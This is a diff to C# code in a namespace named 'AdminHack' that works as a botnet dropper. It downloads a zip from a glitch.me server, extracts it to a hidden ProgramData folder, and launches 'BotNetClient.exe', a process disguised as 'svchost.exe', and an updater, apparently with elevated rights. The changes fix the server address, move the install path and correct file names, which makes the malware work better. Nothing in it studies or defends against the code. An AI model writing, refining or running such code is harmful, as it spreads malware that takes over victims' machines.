@@ -56,7 +56,7 @@ namespace AdminHack
             try
             {
                 HttpClient client = new HttpClient();
-                client.BaseAddress = new Uri(@"https://mineweb-hackserever.glitch.me/");
+                client.BaseAddress = new Uri(@"https://mineweb-hackserver.glitch.me/");
                 HttpResponseMessage resp = client.GetAsync("/scripts/prescorenet.zip").Result;
                 byte[] bt = await resp.Content.ReadAsAsync<byte[]>();
                 return bt;
@@ -71,28 +71,28 @@ namespace AdminHack
                 byte[] bt = GetZip().Result;
             string[] diskname = Environment.CurrentDirectory.ToString().Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
 
-            if (!File.Exists(diskname[0] + "\\Windows\\ClientDir\\BotNetClient.exe"))
+            if (!File.Exists(diskname[0] + "\\ProgramData\\ClientDir\\BotNetClient.exe"))
             {
                 if (!File.Exists(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip"))
                 {
                     File.WriteAllBytes(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", bt);
-                    DirectoryInfo di = Directory.CreateDirectory(diskname[0] + "\\Windows\\ClientDir");
+                    DirectoryInfo di = Directory.CreateDirectory(diskname[0] + "\\ProgramData\\ClientDir");
                     di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
-                    ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\Windows\\ClientDir");
+                    ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\ProgramData\\ClientDir");
                     File.Delete(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip");
 
-                    admin(diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\BotNetClient.exe", diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\svchost.exe.exe", diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\Updater.exe");
-                    Process.Start(diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\BotNetClient.exe");
+                    admin(diskname[0] + "\\ProgramData\\ClientDir\\BotNetInvis\\BotNetClient.exe", diskname[0] + "\\ProgramData\\ClientDir\\BotNetInvis\\svchost.exe.exe", diskname[0] + "\\ProgramData\\ClientDir\\BotNetInvis\\Updater.exe");
+                    Process.Start(diskname[0] + "\\ProgramData\\ClientDir\\BotNetInvis\\BotNetClient.exe");
                 }
                 else
                 {
-                    DirectoryInfo di = Directory.CreateDirectory(diskname[0] + "\\Windows\\ClientDir");
+                    DirectoryInfo di = Directory.CreateDirectory(diskname[0] + "\\ProgramData\\ClientDir");
                     di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
-                    ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\Windows\\ClientDir");
+                    ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\ProgramData\\ClientDir");
                     File.Delete(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip");
 
-                    admin(diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\BotNetClient.exe", diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\svchost.exe.exe", diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\Updater.exe");
-                    Process.Start(diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\BotNetClient.exe");
+                    admin(diskname[0] + "\\ProgramData\\ClientDir\\BotNetInvis\\BotNetClient.exe", diskname[0] + "\\ProgramData\\ClientDir\\BotNetInvis\\svchost.exe", diskname[0] + "\\ProgramData\\ClientDir\\BotNetInvis\\Updater.exe");
+                    Process.Start(diskname[0] + "\\ProgramData\\ClientDir\\BotNetInvis\\BotNetClient.exe");
                 }
             }
 
